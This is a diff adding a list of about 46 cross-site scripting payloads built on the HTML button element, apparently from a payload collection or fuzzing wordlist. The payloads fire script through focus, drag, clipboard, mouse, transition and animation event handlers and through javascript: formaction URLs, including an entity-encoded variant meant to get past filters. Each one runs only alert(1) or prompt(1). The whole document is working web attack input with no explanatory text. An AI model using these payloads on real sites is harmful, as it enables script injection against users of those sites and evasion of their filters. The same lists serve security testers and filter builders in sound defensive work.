@@ -1,0 +1,46 @@
+<form><button formaction=javascript:alert(1)>click 
+<button autofocus onfocus=alert(1)>test</button>
+<button autofocus onfocusin=alert(1)>test</button>
+<button draggable="true" ondrag="alert(1)">test</button>
+<button draggable="true" ondragend="alert(1)">test</button>
+<button draggable="true" ondragenter="alert(1)">test</button>
+<button draggable="true" ondragleave="alert(1)">test</button>
+<button draggable="true" ondragstart="alert(1)">test</button>
+<button id=x tabindex=1 onactivate=alert(1)></button>
+<button id=x tabindex=1 onbeforeactivate=alert(1)></button>
+<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>
+<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>
+<button onbeforecopy="alert(1)" contenteditable>test</button>
+<button onbeforecut="alert(1)" contenteditable>test</button>
+<button onbeforepaste="alert(1)" contenteditable>test</button>
+<button onblur=alert(1) id=x></button><input autofocus>
+<button onclick="alert(1)">test</button>
+<button oncontextmenu="alert(1)">test</button>
+<button oncopy="alert(1)" contenteditable>test</button>
+<button oncut="alert(1)" contenteditable>test</button>
+<button ondblclick="alert(1)">test</button>
+<button onfocusout=alert(1) id=x></button><input autofocus>
+<button onkeydown="alert(1)" contenteditable>test</button>
+<button onkeypress="alert(1)" contenteditable>test</button>
+<button onkeyup="alert(1)" contenteditable>test</button>
+<button onmousedown="alert(1)">test</button>
+<button onmouseenter="alert(1)">test</button>
+<button onmouseleave="alert(1)">test</button>
+<button onmousemove="alert(1)">test</button>
+<button onmouseout="alert(1)">test</button>
+<button onmouseover="alert(1)">test</button>
+<button onmouseup="alert(1)">test</button>
+<button onpaste="alert(1)" contenteditable>test</button>
+<div draggable="true" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>
+<div draggable="true" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>
+<style>:target {color: red;}</style><button id=x style="transition:color 10s" ontransitioncancel=alert(1)></button>
+<style>:target {color:red;}</style><button id=x style="transition:color 1s" ontransitionend=alert(1)></button>
+<style>:target {transform: rotate(180deg);}</style><button id=x style="transition:transform 2s" ontransitionrun=alert(1)></button>
+<style>@keyframes slidein {}</style><button style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></button>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style="position:absolute;" onanimationcancel="alert(1)"></button>
+<style>@keyframes x{}</style><button style="animation-name:x" onanimationend="alert(1)"></button>
+<style>@keyframes x{}</style><button style="animation-name:x" onanimationstart="alert(1)"></button>
+<svg><button onload=alert(1)></button>
+<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<form><button formaction="javascript:alert(1)">
